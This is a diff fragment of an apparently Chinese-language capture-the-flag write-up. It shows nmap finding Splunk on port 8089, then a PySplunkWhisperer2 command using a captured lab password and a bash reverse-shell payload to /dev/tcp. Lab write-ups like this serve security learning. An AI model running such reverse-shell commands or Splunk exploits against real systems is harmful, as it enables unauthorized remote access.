@@ -140,8 +140,7 @@
 <p>登陆成功，但还是普通用户权限，无果</p>
 <p>开始nmap扫出了8089有个splunkd服务</p>
 <p>通过Splunk错误配置，可以进行本地提权或远程执行代码</p>
-<p>我们尝试使用获得的账户和密码来反弹shell，附上</p>
-<p>本地监听4444端口</p>
+<p>我们尝试使用获得的账户和密码来反弹shell，附上<a href="https://github.com/falipan/SplunkWhisperer2">github项目</a></p>
 <p>执行</p>
 <pre><code>python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.2 --username shaun --password Guitar123 --payload &quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'&quot;
 </code></pre>
